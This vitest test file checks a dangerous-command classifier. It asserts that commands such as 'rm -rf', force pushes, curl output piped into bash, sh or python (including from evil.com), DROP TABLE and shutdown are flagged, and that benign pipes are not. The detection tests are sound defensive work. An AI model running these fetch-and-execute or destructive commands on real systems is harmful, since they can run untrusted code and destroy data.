import { describe, it, expect } from "vitest";
import { classifyCommand, isDangerousCommand } from "../utils/dangerousCommand";

// =============================================================================
// True positives — these MUST stay flagged. Anchors the danger detection
// against future false-negatives introduced by relaxing patterns.
// =============================================================================
describe("dangerousCommand — true positives stay flagged", () => {
  it("rm -rf is danger", () => {
    expect(classifyCommand("rm -rf /tmp/foo")?.level).toBe("danger");
  });

  it("git push --force is danger", () => {
    expect(classifyCommand("git push --force origin main")?.level).toBe("danger");
  });

  it("curl URL | bash is danger", () => {
    expect(classifyCommand("curl https://example.com/install.sh | bash")?.level).toBe(
      "danger",
    );
  });

  it("curl URL | sudo bash is danger", () => {
    expect(
      classifyCommand("curl https://example.com/install.sh | sudo bash")?.level,
    ).toBe("danger");
  });

  it("curl URL | sh is danger", () => {
    expect(classifyCommand("curl https://example.com/install.sh | sh")?.level).toBe(
      "danger",
    );
  });

  it("curl URL | python is danger (bare python reads stdin as code)", () => {
    expect(classifyCommand("curl https://evil.com/x | python")?.level).toBe("danger");
    expect(classifyCommand("curl https://evil.com/x | python3")?.level).toBe(
      "danger",
    );
  });

  it("DROP TABLE / DROP DATABASE is danger", () => {
    expect(classifyCommand("DROP TABLE users")?.level).toBe("danger");
    expect(classifyCommand("drop database mydb")?.level).toBe("danger");
  });

  it("shutdown / reboot is danger", () => {
    expect(classifyCommand("shutdown -h now")?.level).toBe("danger");
  });
});

// =============================================================================
// Known-safe commands that the previous regex flagged as dangerous.
// These cover specifically the bug reported by the user.
// =============================================================================
describe("dangerousCommand — known-safe commands are NOT flagged", () => {
  it("curl … | python3 -m json.tool is safe (the reported false-positive)", () => {
    const cmd =
      'curl -s "https://api.telegram.org/bot1234/getUpdates?offset=1&limit=10" 2>&1 | python3 -m json.tool';
    expect(isDangerousCommand(cmd)).toBe(false);
  });

  it("curl … | python -m http.server is safe", () => {
    expect(
      isDangerousCommand("curl https://example.com/data | python -m http.server"),
    ).toBe(false);
  });

  it("curl … | python3 -c \"...\" is safe (inline code, not the curl output)", () => {
    expect(
      isDangerousCommand(
        "curl https://api.example.com/x | python3 -c \"import sys, json; print(json.load(sys.stdin)['x'])\"",
      ),
    ).toBe(false);
  });

  it("curl … | jq is safe", () => {
    expect(
      isDangerousCommand("curl https://api.example.com/x | jq '.results'"),
    ).toBe(false);
  });

  it("curl … | bash script.sh is safe (script file, not stdin)", () => {
    // bash with an explicit script argument — doesn't read stdin as code
    expect(
      isDangerousCommand("curl https://example.com/x | bash script.sh"),
    ).toBe(false);
  });

  it("a plain ls / cat / grep is safe", () => {
    expect(isDangerousCommand("ls -la /tmp")).toBe(false);
    expect(isDangerousCommand("cat /etc/hosts")).toBe(false);
    expect(isDangerousCommand("grep -r foo .")).toBe(false);
  });

  it("git status / git pull is safe", () => {
    expect(isDangerousCommand("git status")).toBe(false);
    expect(isDangerousCommand("git pull --rebase")).toBe(false);
  });

  it("docker ps / docker logs is safe", () => {
    expect(isDangerousCommand("docker ps -a")).toBe(false);
    expect(isDangerousCommand("docker logs my-container")).toBe(false);
  });

  it("npm install / pip install is safe", () => {
    expect(isDangerousCommand("npm install")).toBe(false);
    expect(isDangerousCommand("pip install requests")).toBe(false);
  });

  it("running a script with python is safe", () => {
    expect(isDangerousCommand("python3 my_script.py")).toBe(false);
    expect(isDangerousCommand("python -m pytest tests/")).toBe(false);
  });
});
